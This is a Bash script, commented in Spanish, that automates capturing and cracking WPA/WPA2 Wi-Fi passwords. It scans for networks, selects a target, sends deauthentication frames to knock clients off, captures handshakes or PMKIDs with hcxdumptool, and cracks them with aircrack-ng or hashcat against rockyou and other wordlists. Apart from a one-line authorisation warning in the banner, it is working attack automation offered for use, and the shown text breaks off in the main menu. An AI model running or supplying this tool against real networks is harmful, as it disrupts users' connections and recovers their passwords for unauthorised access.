#!/bin/bash

# 🤝 HANDSHAKE ULTIMATE SCANNER
# Captura, análisis y crack de handshakes WPA/WPA2

RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
NC='\033[0m'

# Variables globales
INTERFACE=""
TARGET_BSSID=""
TARGET_ESSID=""
HANDSHAKE_FILE=""
ATTACK_TYPE=""
OUTPUT_DIR=""
WORDLIST=""
CLIENT_MAC=""

print_banner() {
    clear
    echo -e "${BLUE}"
    echo "██╗  ██╗ █████╗ ███╗   ██╗██████╗ ███████╗██╗  ██╗ █████╗ ██╗  ██╗███████╗"
    echo "██║  ██║██╔══██╗████╗  ██║██╔══██╗██╔════╝██║  ██║██╔══██╗██║ ██╔╝██╔════╝"
    echo "███████║███████║██╔██╗ ██║██║  ██║███████╗███████║███████║█████╔╝ █████╗  "
    echo "██╔══██║██╔══██║██║╚██╗██║██║  ██║╚════██║██╔══██║██╔══██║██╔═██╗ ██╔══╝  "
    echo "██║  ██║██║  ██║██║ ╚████║██████╔╝███████║██║  ██║██║  ██║██║  ██╗███████╗"
    echo "╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═══╝╚═════╝ ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝"
    echo "    ██╗   ██╗██╗  ████████╗██╗███╗   ███╗ █████╗ ████████╗███████╗"
    echo "    ██║   ██║██║  ╚══██╔══╝██║████╗ ████║██╔══██╗╚══██╔══╝██╔════╝"
    echo "    ██║   ██║██║     ██║   ██║██╔████╔██║███████║   ██║   █████╗  "
    echo "    ██║   ██║██║     ██║   ██║██║╚██╔╝██║██╔══██║   ██║   ██╔══╝  "
    echo "    ╚██████╔╝███████╗██║   ██║██║ ╚═╝ ██║██║  ██║   ██║   ███████╗"
    echo "     ╚═════╝ ╚══════╝╚═╝   ╚═╝╚═╝     ╚═╝╚═╝  ╚═╝   ╚═╝   ╚══════╝"
    echo -e "${NC}"
    echo -e "${CYAN}🤝 Handshake Ultimate - Captura y Análisis WPA/WPA2${NC}"
    echo -e "${YELLOW}⚠️  Solo usar en redes propias o con autorización${NC}"
    echo ""
}

check_interface() {
    echo -e "${YELLOW}🔍 Verificando interface WiFi...${NC}"
    
    # Detectar interfaces WiFi
    local wifi_interfaces=($(iwconfig 2>/dev/null | grep -E "^[a-z].*IEEE 802.11" | cut -d' ' -f1))
    
    if [[ ${#wifi_interfaces[@]} -eq 0 ]]; then
        echo -e "${RED}❌ No se detectaron interfaces WiFi${NC}"
        return 1
    fi
    
    echo -e "${CYAN}📡 Interfaces WiFi disponibles:${NC}"
    for i in "${!wifi_interfaces[@]}"; do
        local iface="${wifi_interfaces[$i]}"
        local mode=$(iwconfig "$iface" 2>/dev/null | grep "Mode:" | awk '{print $4}' | cut -d':' -f2)
        echo -e "  ${CYAN}$((i+1)).${NC} $iface (Modo: $mode)"
    done
    
    read -p "🎯 Selecciona interface (1-${#wifi_interfaces[@]}): " iface_choice
    
    if [[ "$iface_choice" -ge 1 && "$iface_choice" -le ${#wifi_interfaces[@]} ]]; then
        INTERFACE="${wifi_interfaces[$((iface_choice-1))]}"
    else
        INTERFACE="${wifi_interfaces[0]}"
    fi
    
    # Verificar/activar modo monitor
    local current_mode=$(iwconfig "$INTERFACE" 2>/dev/null | grep "Mode:" | awk '{print $4}' | cut -d':' -f2)
    
    if [[ "$current_mode" != "Monitor" ]]; then
        echo -e "${YELLOW}⚠️ Interface no está en modo monitor${NC}"
        read -p "¿Activar modo monitor? (Y/n): " activate_monitor
        
        if [[ $activate_monitor != [nN] ]]; then
            echo -e "${CYAN}🔧 Activando modo monitor...${NC}"
            sudo airmon-ng stop "$INTERFACE" 2>/dev/null
            sudo airmon-ng start "$INTERFACE" 2>/dev/null
            
            # Buscar nueva interface monitor
            local monitor_iface=$(iwconfig 2>/dev/null | grep -E "Mode:Monitor" | cut -d' ' -f1)
            if [[ -n "$monitor_iface" ]]; then
                INTERFACE="$monitor_iface"
                echo -e "${GREEN}✅ Modo monitor activado: $INTERFACE${NC}"
            else
                echo -e "${RED}❌ No se pudo activar modo monitor${NC}"
                return 1
            fi
        fi
    else
        echo -e "${GREEN}✅ Interface en modo monitor: $INTERFACE${NC}"
    fi
}

scan_networks() {
    echo -e "\n${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC}          ${YELLOW}ESCANEO DE REDES WPA${NC}           ${BLUE}║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════╝${NC}"
    
    local scan_file="/tmp/handshake_scan_$(date +%H%M%S)"
    
    echo -e "${CYAN}📡 Escaneando redes WPA/WPA2...${NC}"
    echo -e "${YELLOW}⏳ Presiona Ctrl+C después de 30 segundos${NC}"
    
    # Escanear con airodump-ng
    timeout 30 sudo airodump-ng "$INTERFACE" --write "$scan_file" --output-format csv 2>/dev/null || true
    
    if [[ ! -f "$scan_file-01.csv" ]]; then
        echo -e "${RED}❌ No se generó archivo de scan${NC}"
        return 1
    fi
    
    # Procesar resultados y mostrar solo WPA/WPA2
    echo -e "\n${GREEN}🔒 Redes WPA/WPA2 encontradas:${NC}"
    echo -e "${BLUE}ID  BSSID             ESSID                    CH  PWR  ENC${NC}"
    echo -e "${BLUE}──  ─────────────────  ───────────────────────  ──  ───  ───${NC}"
    
    local counter=1
    declare -A networks_map
    
    while IFS=',' read -r bssid first_seen last_seen channel speed privacy cipher auth power beacons iv lan_ip id_length essid key_type; do
        # Filtrar solo redes WPA/WPA2
        if [[ "$privacy" == *"WPA"* && -n "$essid" && "$essid" != " ESSID" ]]; then
            printf "${CYAN}%2d${NC}  %-17s  %-23s  %2s  %3s  %s\n" "$counter" "$bssid" "$essid" "$channel" "$power" "$privacy"
            networks_map["$counter"]="$bssid|$essid|$channel"
            ((counter++))
        fi
    done < "$scan_file-01.csv"
    
    if [[ $counter -eq 1 ]]; then
        echo -e "${YELLOW}⚠️ No se encontraron redes WPA/WPA2${NC}"
        return 1
    fi
    
    echo ""
    read -p "🎯 Selecciona red objetivo (1-$((counter-1))): " network_choice
    
    if [[ -n "${networks_map[$network_choice]}" ]]; then
        local network_info="${networks_map[$network_choice]}"
        TARGET_BSSID=$(echo "$network_info" | cut -d'|' -f1)
        TARGET_ESSID=$(echo "$network_info" | cut -d'|' -f2)
        local target_channel=$(echo "$network_info" | cut -d'|' -f3)
        
        echo -e "${GREEN}✅ Objetivo seleccionado:${NC}"
        echo -e "  📡 BSSID: ${CYAN}$TARGET_BSSID${NC}"
        echo -e "  📝 ESSID: ${CYAN}$TARGET_ESSID${NC}"
        echo -e "  📻 Canal: ${CYAN}$target_channel${NC}"
        
        # Fijar canal
        sudo iwconfig "$INTERFACE" channel "$target_channel" 2>/dev/null
    else
        echo -e "${RED}❌ Selección inválida${NC}"
        return 1
    fi
    
    # Limpiar archivos temporales
    rm -f "$scan_file"*
}

select_attack_method() {
    echo -e "\n${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC}         ${YELLOW}MÉTODO DE CAPTURA${NC}              ${BLUE}║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════╝${NC}"
    
    echo -e "${YELLOW}¿Qué método quieres usar?${NC}"
    echo -e "  ${CYAN}1.${NC} 🎣 Captura pasiva ${PURPLE}[esperar handshake natural]${NC}"
    echo -e "  ${CYAN}2.${NC} ⚡ Ataque de deautenticación ${PURPLE}[airodump-ng + aireplay-ng]${NC}"
    echo -e "  ${CYAN}3.${NC} 💥 PMKID attack sin deauth ${PURPLE}[hcxdumptool]${NC}"
    echo -e "  ${CYAN}4.${NC} 🔥 Crack offline de handshake existente ${PURPLE}[hashcat]${NC}"
    echo -e "  ${CYAN}5.${NC} 🎯 Ataque dirigido a cliente específico"
    echo ""
    
    read -p "Selecciona método (1-5): " attack_choice
    
    case $attack_choice in
        1)
            ATTACK_TYPE="passive"
            echo -e "${GREEN}✅ Captura pasiva seleccionada${NC}"
            ;;
        2)
            ATTACK_TYPE="deauth"
            echo -e "${GREEN}✅ Ataque de deautenticación${NC}"
            ;;
        3)
            ATTACK_TYPE="pmkid"
            echo -e "${GREEN}✅ PMKID attack${NC}"
            ;;
        4)
            ATTACK_TYPE="crack_offline"
            echo -e "${GREEN}✅ Crack offline${NC}"
            select_existing_handshake
            return
            ;;
        5)
            ATTACK_TYPE="targeted"
            echo -e "${GREEN}✅ Ataque dirigido${NC}"
            scan_clients
            ;;
        *)
            echo -e "${YELLOW}Usando captura pasiva por defecto${NC}"
            ATTACK_TYPE="passive"
            ;;
    esac
}

scan_clients() {
    echo -e "\n${CYAN}👥 Escaneando clientes conectados a $TARGET_ESSID...${NC}"
    
    local client_scan="/tmp/client_scan_$(date +%H%M%S)"
    
    echo -e "${YELLOW}⏳ Presiona Ctrl+C después de 20 segundos${NC}"
    
    timeout 20 sudo airodump-ng "$INTERFACE" --bssid "$TARGET_BSSID" --write "$client_scan" --output-format csv 2>/dev/null || true
    
    if [[ -f "$client_scan-01.csv" ]]; then
        # Buscar sección de clientes
        local clients_section=$(grep -n "Station MAC" "$client_scan-01.csv" 2>/dev/null | head -1 | cut -d':' -f1)
        
        if [[ -n "$clients_section" ]]; then
            echo -e "\n${GREEN}👤 Clientes detectados:${NC}"
            echo -e "${BLUE}ID  MAC Address        Power  Last Seen${NC}"
            echo -e "${BLUE}──  ─────────────────  ─────  ─────────${NC}"
            
            local counter=1
            declare -A clients_map
            
            tail -n +$((clients_section + 1)) "$client_scan-01.csv" | while IFS=',' read -r station_mac first_seen last_seen power packets bssid probes; do
                if [[ -n "$station_mac" && "$station_mac" != " Station MAC" ]]; then
                    printf "${CYAN}%2d${NC}  %-17s  %5s  %s\n" "$counter" "$station_mac" "$power" "$last_seen"
                    clients_map["$counter"]="$station_mac"
                    ((counter++))
                fi
            done
            
            if [[ $counter -gt 1 ]]; then
                read -p "🎯 Selecciona cliente objetivo (1-$((counter-1)) o 0 para todos): " client_choice
                
                if [[ "$client_choice" == "0" ]]; then
                    CLIENT_MAC=""
                    echo -e "${YELLOW}⚡ Atacando todos los clientes${NC}"
                elif [[ -n "${clients_map[$client_choice]}" ]]; then
                    CLIENT_MAC="${clients_map[$client_choice]}"
                    echo -e "${GREEN}✅ Cliente objetivo: $CLIENT_MAC${NC}"
                fi
            fi
        else
            echo -e "${YELLOW}⚠️ No se detectaron clientes conectados${NC}"
            echo -e "${CYAN}💡 Continuando con ataque general${NC}"
        fi
    fi
    
    rm -f "$client_scan"*
}

select_existing_handshake() {
    echo -e "\n${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC}        ${YELLOW}HANDSHAKE EXISTENTE${NC}             ${BLUE}║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════╝${NC}"
    
    echo -e "${YELLOW}¿Qué archivo quieres analizar?${NC}"
    echo -e "  ${CYAN}1.${NC} Buscar automáticamente en directorio actual"
    echo -e "  ${CYAN}2.${NC} Especificar ruta manualmente"
    echo ""
    
    read -p "Selecciona opción (1-2): " file_choice
    
    case $file_choice in
        1)
            local cap_files=($(find . -name "*.cap" -o -name "*.pcap" -o -name "*.hccapx" 2>/dev/null))
            
            if [[ ${#cap_files[@]} -eq 0 ]]; then
                echo -e "${YELLOW}⚠️ No se encontraron archivos de captura${NC}"
                read -p "🎯 Ruta del archivo: " HANDSHAKE_FILE
            else
                echo -e "${GREEN}📁 Archivos encontrados:${NC}"
                for i in "${!cap_files[@]}"; do
                    echo -e "  ${CYAN}$((i+1)).${NC} ${cap_files[$i]}"
                done
                
                read -p "Selecciona archivo (1-${#cap_files[@]}): " file_idx
                if [[ "$file_idx" -ge 1 && "$file_idx" -le ${#cap_files[@]} ]]; then
                    HANDSHAKE_FILE="${cap_files[$((file_idx-1))]}"
                fi
            fi
            ;;
        2)
            read -p "🎯 Ruta completa del archivo: " HANDSHAKE_FILE
            ;;
    esac
    
    if [[ ! -f "$HANDSHAKE_FILE" ]]; then
        echo -e "${RED}❌ Archivo no encontrado: $HANDSHAKE_FILE${NC}"
        return 1
    fi
    
    echo -e "${GREEN}✅ Archivo seleccionado: $HANDSHAKE_FILE${NC}"
    
    # Verificar handshakes en el archivo
    verify_handshake "$HANDSHAKE_FILE"
}

setup_output_directory() {
    OUTPUT_DIR="handshake_$(date +%Y%m%d_%H%M%S)"
    mkdir -p "$OUTPUT_DIR"/{captures,wordlists,results,logs}
    
    echo -e "${GREEN}📁 Directorio creado: $OUTPUT_DIR${NC}"
    
    # Crear archivo de información
    cat > "$OUTPUT_DIR/attack_info.txt" << EOF
# Handshake Attack Info - $(date)
Interface: $INTERFACE
Target BSSID: $TARGET_BSSID
Target ESSID: $TARGET_ESSID
Attack Type: $ATTACK_TYPE
Client MAC: $CLIENT_MAC
Started: $(date)
EOF
}

execute_passive_capture() {
    echo -e "\n${YELLOW}🎣 Iniciando captura pasiva...${NC}"
    
    local capture_file="$OUTPUT_DIR/captures/handshake_$TARGET_ESSID"
    
    echo -e "${CYAN}📡 Monitoreando red: $TARGET_ESSID${NC}"
    echo -e "${YELLOW}⏳ Esperando handshake natural (Ctrl+C para detener)${NC}"
    echo -e "${BLUE}💡 Alguien debe conectarse/reconectarse a la red${NC}"
    
    # Captura con airodump-ng
    sudo airodump-ng "$INTERFACE" \
        --bssid "$TARGET_BSSID" \
        --write "$capture_file" \
        --output-format pcap,csv,kismet \
        2>&1 | tee "$OUTPUT_DIR/logs/passive_capture.log" || true
    
    # Verificar si se capturó handshake
    if [[ -f "$capture_file-01.cap" ]]; then
        verify_handshake "$capture_file-01.cap"
    else
        echo -e "${YELLOW}⚠️ No se generó archivo de captura${NC}"
    fi
}

execute_deauth_attack() {
    echo -e "\n${YELLOW}⚡ Ejecutando ataque de deautenticación...${NC}"
    
    local capture_file="$OUTPUT_DIR/captures/deauth_$TARGET_ESSID"
    
    echo -e "${CYAN}📡 Configurando captura en segundo plano...${NC}"
    
    # Iniciar captura en segundo plano
    sudo airodump-ng "$INTERFACE" \
        --bssid "$TARGET_BSSID" \
        --write "$capture_file" \
        --output-format pcap,csv &
    
    local airodump_pid=$!
    sleep 5
    
    echo -e "${RED}💥 Iniciando ataque de deautenticación...${NC}"
    
    if [[ -n "$CLIENT_MAC" ]]; then
        echo -e "${CYAN}🎯 Atacando cliente específico: $CLIENT_MAC${NC}"
        sudo aireplay-ng --deauth 10 -a "$TARGET_BSSID" -c "$CLIENT_MAC" "$INTERFACE" \
            2>&1 | tee "$OUTPUT_DIR/logs/deauth_targeted.log"
    else
        echo -e "${CYAN}🎯 Atacando todos los clientes${NC}"
        sudo aireplay-ng --deauth 10 -a "$TARGET_BSSID" "$INTERFACE" \
            2>&1 | tee "$OUTPUT_DIR/logs/deauth_broadcast.log"
    fi
    
    echo -e "${YELLOW}⏳ Esperando captura de handshake...${NC}"
    sleep 10
    
    # Detener airodump-ng
    sudo kill "$airodump_pid" 2>/dev/null || true
    sleep 2
    
    # Verificar captura
    if [[ -f "$capture_file-01.cap" ]]; then
        verify_handshake "$capture_file-01.cap"
    else
        echo -e "${RED}❌ No se capturó handshake${NC}"
    fi
}

execute_pmkid_attack() {
    echo -e "\n${YELLOW}💥 Ejecutando PMKID attack...${NC}"
    
    # Verificar si hcxdumptool está disponible
    if ! command -v hcxdumptool &> /dev/null; then
        echo -e "${RED}❌ hcxdumptool no está instalado${NC}"
        echo -e "${YELLOW}💡 Instala con: sudo apt install hcxtools${NC}"
        return 1
    fi
    
    local pmkid_file="$OUTPUT_DIR/captures/pmkid_$TARGET_ESSID.pcapng"
    
    echo -e "${CYAN}🔍 Atacando PMKID en $TARGET_BSSID...${NC}"
    echo -e "${BLUE}💡 Este ataque no require desconectar clientes${NC}"
    
    # Crear filtro para el AP objetivo
    echo "$TARGET_BSSID" > /tmp/target_ap.txt
    
    # Ejecutar hcxdumptool
    sudo hcxdumptool \
        -i "$INTERFACE" \
        -o "$pmkid_file" \
        --filterlist=/tmp/target_ap.txt \
        --filtermode=2 \
        --enable_status=15 \
        2>&1 | tee "$OUTPUT_DIR/logs/pmkid_attack.log" &
    
    local hcx_pid=$!
    
    echo -e "${YELLOW}⏳ Atacando PMKID por 60 segundos...${NC}"
    sleep 60
    
    # Detener hcxdumptool
    sudo kill "$hcx_pid" 2>/dev/null || true
    sleep 2
    
    # Convertir a formato hashcat
    if [[ -f "$pmkid_file" ]]; then
        local hash_file="$OUTPUT_DIR/results/pmkid_hashes.txt"
        
        if command -v hcxpcapngtool &> /dev/null; then
            hcxpcapngtool -o "$hash_file" "$pmkid_file" 2>/dev/null
            
            if [[ -f "$hash_file" && -s "$hash_file" ]]; then
                local hash_count=$(wc -l < "$hash_file")
                echo -e "${GREEN}✅ PMKID capturado: $hash_count hash(es)${NC}"
                echo -e "${CYAN}📁 Hashes guardados en: $hash_file${NC}"
                
                # Ofrecer crack inmediato
                read -p "¿Intentar crack con wordlist? (y/N): " try_crack
                if [[ $try_crack == [yY] ]]; then
                    crack_pmkid_hash "$hash_file"
                fi
            else
                echo -e "${YELLOW}⚠️ No se capturó PMKID${NC}"
            fi
        else
            echo -e "${YELLOW}⚠️ hcxpcapngtool no disponible para conversión${NC}"
        fi
    else
        echo -e "${RED}❌ No se generó archivo de captura${NC}"
    fi
    
    rm -f /tmp/target_ap.txt
}

verify_handshake() {
    local cap_file="$1"
    
    echo -e "\n${CYAN}🔍 Verificando handshake en: $(basename "$cap_file")${NC}"
    
    if [[ ! -f "$cap_file" ]]; then
        echo -e "${RED}❌ Archivo no encontrado${NC}"
        return 1
    fi
    
    # Verificar con aircrack-ng
    local aircrack_result=$(aircrack-ng "$cap_file" 2>/dev/null | grep -E "WPA|handshake")
    
    if [[ -n "$aircrack_result" ]]; then
        echo -e "${GREEN}✅ Handshake válido detectado!${NC}"
        echo -e "${CYAN}📊 Detalles:${NC}"
        echo "$aircrack_result"
        
        HANDSHAKE_FILE="$cap_file"
        
        # Ofrecer crack inmediato
        read -p "¿Intentar crack del handshake? (y/N): " try_crack
        if [[ $try_crack == [yY] ]]; then
            select_wordlist
            crack_handshake
        fi
    else
        echo -e "${RED}❌ No se detectó handshake válido${NC}"
        echo -e "${YELLOW}💡 Intenta capturar de nuevo o usar método diferente${NC}"
    fi
}

select_wordlist() {
    echo -e "\n${BLUE}╔════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC}         ${YELLOW}SELECCIÓN DE WORDLIST${NC}          ${BLUE}║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════╝${NC}"
    
    echo -e "${YELLOW}¿Qué wordlist usar?${NC}"
    echo -e "  ${CYAN}1.${NC} rockyou.txt ${PURPLE}[14M contraseñas]${NC}"
    echo -e "  ${CYAN}2.${NC} darkweb2017-top10000.txt ${PURPLE}[10K más comunes]${NC}"
    echo -e "  ${CYAN}3.${NC} Wordlist personalizada"
    echo -e "  ${CYAN}4.${NC} Generar wordlist con crunch"
    echo -e "  ${CYAN}5.${NC} Múltiples wordlists"
    echo ""
    
    read -p "Selecciona wordlist (1-5): " wordlist_choice
    
    case $wordlist_choice in
        1)
            local rockyou_paths=(
                "/usr/share/wordlists/rockyou.txt"
                "/usr/share/wordlists/rockyou.txt.gz"
                "~/wordlists/rockyou.txt"
            )
            
            for path in "${rockyou_paths[@]}"; do
                if [[ -f "$path" ]]; then
                    WORDLIST="$path"
                    break
                elif [[ -f "$path.gz" ]]; then
                    echo -e "${CYAN}📦 Descomprimiendo rockyou.txt...${NC}"
                    gunzip "$path.gz" 2>/dev/null || true
                    WORDLIST="$path"
                    break
                fi
            done
            
            if [[ -z "$WORDLIST" ]]; then
                echo -e "${YELLOW}⚠️ rockyou.txt no encontrado${NC}"
                read -p "🎯 Ruta del wordlist: " WORDLIST
            fi
            ;;
        2)
            WORDLIST="/usr/share/seclists/Passwords/Common-Credentials/darkweb2017-top10000.txt"
            if [[ ! -f "$WORDLIST" ]]; then
                echo -e "${YELLOW}⚠️ SecLists no encontrado${NC}"
                read -p "🎯 Ruta del wordlist: " WORDLIST
            fi
            ;;
        3)
            read -p "🎯 Ruta del wordlist personalizado: " WORDLIST
            ;;
        4)
            generate_crunch_wordlist
            ;;
        5)
            select_multiple_wordlists
            ;;
        *)
            echo -e "${YELLOW}Usando rockyou.txt por defecto${NC}"
            WORDLIST="/usr/share/wordlists/rockyou.txt"
            ;;
    esac
    
    if [[ ! -f "$WORDLIST" ]]; then
        echo -e "${RED}❌ Wordlist no encontrado: $WORDLIST${NC}"
        return 1
    fi
    
    local word_count=$(wc -l < "$WORDLIST" 2>/dev/null || echo "desconocido")
    echo -e "${GREEN}✅ Wordlist: $WORDLIST ($word_count palabras)${NC}"
}

generate_crunch_wordlist() {
    echo -e "\n${CYAN}🔧 Generando wordlist con crunch...${NC}"
    
    if ! command -v crunch &> /dev/null; then
        echo -e "${RED}❌ Crunch no está instalado${NC}"
        echo -e "${YELLOW}💡 Instala con: sudo apt install crunch${NC}"
        return 1
    fi
    
    echo -e "${YELLOW}Configuración de crunch:${NC}"
    read -p "🔢 Longitud mínima: " min_len
    read -p "🔢 Longitud máxima: " max_len
    read -p "🔤 Caracteres (a-z, 0-9, etc.): " charset
    
    local crunch_file="$OUTPUT_DIR/wordlists/crunch_${min_len}_${max_len}.txt"
    
    echo -e "${CYAN}🔧 Generando wordlist...${NC}"
    crunch "$min_len" "$max_len" "$charset" -o "$crunch_file"
    
    if [[ -f "$crunch_file" ]]; then
        WORDLIST="$crunch_file"
        local word_count=$(wc -l < "$crunch_file")
        echo -e "${GREEN}✅ Wordlist generada: $word_count palabras${NC}"
    else
        echo -e "${RED}❌ Error generando wordlist${NC}"
    fi
}

select_multiple_wordlists() {
    echo -e "\n${CYAN}📚 Configurando múltiples wordlists...${NC}"
    
    local wordlist_file="$OUTPUT_DIR/wordlists/combined_wordlist.txt"
    
    echo -e "${YELLOW}Combinar wordlists:${NC}"
    echo -e "  1. rockyou.txt"
    echo -e "  2. darkweb2017-top10000.txt"  
    echo -e "  3. Wordlist personalizada"
    echo ""
    
    read -p "¿Incluir rockyou.txt? (Y/n): " include_rockyou
    read -p "¿Incluir darkweb2017? (Y/n): " include_darkweb
    read -p "¿Agregar wordlist personalizada? (y/N): " include_custom
    
    echo -e "${CYAN}🔧 Combinando wordlists...${NC}"
    
    # Combinar wordlists
    > "$wordlist_file"  # Limpiar archivo
    
    if [[ $include_rockyou != [nN] ]]; then
        cat /usr/share/wordlists/rockyou.txt >> "$wordlist_file" 2>/dev/null || true
    fi
    
    if [[ $include_darkweb != [nN] ]]; then
        cat /usr/share/seclists/Passwords/Common-Credentials/darkweb2017-top10000.txt >> "$wordlist_file" 2>/dev/null || true
    fi
    
    if [[ $include_custom == [yY] ]]; then
        read -p "🎯 Ruta del wordlist personalizado: " custom_wordlist
        if [[ -f "$custom_wordlist" ]]; then
            cat "$custom_wordlist" >> "$wordlist_file"
        fi
    fi
    
    # Remover duplicados y ordenar
    sort -u "$wordlist_file" -o "$wordlist_file"
    
    WORDLIST="$wordlist_file"
    local word_count=$(wc -l < "$wordlist_file")
    echo -e "${GREEN}✅ Wordlist combinada: $word_count palabras únicas${NC}"
}

crack_handshake() {
    echo -e "\n${YELLOW}🔓 Iniciando crack del handshake...${NC}"
    
    if [[ ! -f "$HANDSHAKE_FILE" || ! -f "$WORDLIST" ]]; then
        echo -e "${RED}❌ Handshake o wordlist no disponible${NC}"
        return 1
    fi
    
    echo -e "${CYAN}🎯 Archivo: $HANDSHAKE_FILE${NC}"
    echo -e "${CYAN}📚 Wordlist: $WORDLIST${NC}"
    
    local result_file="$OUTPUT_DIR/results/cracked_password.txt"
    
    echo -e "${BLUE}💻 Método de crack:${NC}"
    echo -e "  ${CYAN}1.${NC} Aircrack-ng ${PURPLE}[CPU, más lento]${NC}"
    echo -e "  ${CYAN}2.${NC} Hashcat ${PURPLE}[GPU, más rápido]${NC}"
    echo -e "  ${CYAN}3.${NC} Ambos métodos"
    echo ""
    
    read -p "Selecciona método (1-3): " crack_method
    
    case $crack_method in
        1|3)
            echo -e "\n${CYAN}🔓 Intentando crack con aircrack-ng...${NC}"
            
            # Ejecutar aircrack-ng
            local aircrack_output="$OUTPUT_DIR/logs/aircrack_output.txt"
            
            aircrack-ng "$HANDSHAKE_FILE" -w "$WORDLIST" \
                2>&1 | tee "$aircrack_output"
            
            # Buscar password en output
            local password=$(grep -o "KEY FOUND! \[ .* \]" "$aircrack_output" | sed 's/KEY FOUND! \[ \(.*\) \]/\1/')
            
            if [[ -n "$password" ]]; then
                echo -e "${GREEN}🎉 ¡CONTRASEÑA ENCONTRADA!${NC}"
                echo -e "${YELLOW}🔑 Password: $password${NC}"
                echo "$password" > "$result_file"
                echo -e "${CYAN}💾 Guardada en: $result_file${NC}"
                
                if [[ "$crack_method" == "1" ]]; then
                    return 0
                fi
            else
                echo -e "${RED}❌ Aircrack-ng no encontró la contraseña${NC}"
            fi
            ;;
    esac
    
    case $crack_method in
        2|3)
            echo -e "\n${CYAN}⚡ Intentando crack con hashcat...${NC}"
            
            if ! command -v hashcat &> /dev/null; then
                echo -e "${RED}❌ Hashcat no está instalado${NC}"
                echo -e "${YELLOW}💡 Instala con: sudo apt install hashcat${NC}"
                return 1
            fi
            
            # Convertir handshake a formato hashcat
            local hccapx_file="$OUTPUT_DIR/results/handshake.hccapx"
            
            if command -v cap2hccapx &> /dev/null; then
                cap2hccapx "$HANDSHAKE_FILE" "$hccapx_file" 2>/dev/null
            else
                echo -e "${YELLOW}⚠️ cap2hccapx no disponible, usando aircrack2john...${NC}"
                # Método alternativo
                if command -v aircrack2john &> /dev/null; then
                    aircrack2john "$HANDSHAKE_FILE" > "$OUTPUT_DIR/results/handshake.john"
                    hccapx_file="$OUTPUT_DIR/results/handshake.john"
                else
                    echo -e "${RED}❌ No se puede convertir para hashcat${NC}"
                    return 1
                fi
            fi
            
            if [[ -f "$hccapx_file" ]]; then
                echo -e "${CYAN}⚡ Ejecutando hashcat...${NC}"
                
                # Ejecutar hashcat
                hashcat -m 2500 "$hccapx_file" "$WORDLIST" \
                    --outfile="$result_file" \
                    --outfile-format=2 \
                    --quiet \
                    2>&1 | tee "$OUTPUT_DIR/logs/hashcat_output.txt"
                
                if [[ -f "$result_file" && -s "$result_file" ]]; then
                    local password=$(cat "$result_file" | cut -d':' -f2)
                    echo -e "${GREEN}🎉 ¡CONTRASEÑA ENCONTRADA CON HASHCAT!${NC}"
                    echo -e "${YELLOW}🔑 Password: $password${NC}"
                else
                    echo -e "${RED}❌ Hashcat no encontró la contraseña${NC}"
                fi
            fi
            ;;
    esac
    
    if [[ ! -f "$result_file" || ! -s "$result_file" ]]; then
        echo -e "\n${YELLOW}💡 Sugerencias si no se encontró la contraseña:${NC}"
        echo -e "  • Usar wordlist más grande"
        echo -e "  • Generar wordlist específica con crunch"
        echo -e "  • Intentar reglas de mutación con hashcat"
        echo -e "  • Verificar que el handshake sea válido"
    fi
}

crack_pmkid_hash() {
    local hash_file="$1"
    
    echo -e "\n${YELLOW}⚡ Crackeando PMKID hash...${NC}"
    
    if ! command -v hashcat &> /dev/null; then
        echo -e "${RED}❌ Hashcat requerido para PMKID${NC}"
        return 1
    fi
    
    select_wordlist
    
    if [[ ! -f "$WORDLIST" ]]; then
        return 1
    fi
    
    local result_file="$OUTPUT_DIR/results/pmkid_cracked.txt"
    
    echo -e "${CYAN}⚡ Ejecutando hashcat modo PMKID (16800)...${NC}"
    
    hashcat -m 16800 "$hash_file" "$WORDLIST" \
        --outfile="$result_file" \
        --outfile-format=2 \
        --quiet \
        2>&1 | tee "$OUTPUT_DIR/logs/pmkid_hashcat.txt"
    
    if [[ -f "$result_file" && -s "$result_file" ]]; then
        echo -e "${GREEN}🎉 ¡PMKID CRACKEADO!${NC}"
        cat "$result_file"
        echo -e "${CYAN}💾 Resultado guardado en: $result_file${NC}"
    else
        echo -e "${RED}❌ No se pudo crackear el PMKID${NC}"
    fi
}

show_results_summary() {
    echo -e "\n${BLUE}╔════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${BLUE}║${NC}                        ${YELLOW}RESUMEN DE RESULTADOS${NC}                          ${BLUE}║${NC}"
    echo -e "${BLUE}╚════════════════════════════════════════════════════════════════════════════╝${NC}"
    
    echo -e "${CYAN}📁 Directorio del proyecto: $OUTPUT_DIR${NC}"
    
    if [[ -n "$TARGET_BSSID" ]]; then
        echo -e "\n${GREEN}🎯 Objetivo atacado:${NC}"
        echo -e "  📡 BSSID: $TARGET_BSSID"
        echo -e "  📝 ESSID: $TARGET_ESSID"
    fi
    
    echo -e "\n${CYAN}📊 Archivos generados:${NC}"
    find "$OUTPUT_DIR" -type f 2>/dev/null | while read file; do
        local size=$(du -h "$file" 2>/dev/null | cut -f1)
        local rel_path=${file#$OUTPUT_DIR/}
        echo -e "  📄 $rel_path ($size)"
    done
    
    # Verificar si se encontró contraseña
    local password_files=($(find "$OUTPUT_DIR/results" -name "*cracked*.txt" -o -name "*password*.txt" 2>/dev/null))
    
    if [[ ${#password_files[@]} -gt 0 ]]; then
        for pfile in "${password_files[@]}"; do
            if [[ -s "$pfile" ]]; then
                echo -e "\n${GREEN}🎉 ¡CONTRASEÑA ENCONTRADA!${NC}"
                echo -e "${YELLOW}🔑 Ver: $pfile${NC}"
                break
            fi
        done
    fi
}

main_menu() {
    while true; do
        print_banner
        
        echo -e "${BLUE}╔══════════════════════════════════════════════════════════════════════════╗${NC}"
        echo -e "${BLUE}║${NC}                         ${YELLOW}MENÚ PRINCIPAL${NC}                               ${BLUE}║${NC}"
        echo -e "${BLUE}╠══════════════════════════════════════════════════════════════════════════╣${NC}"
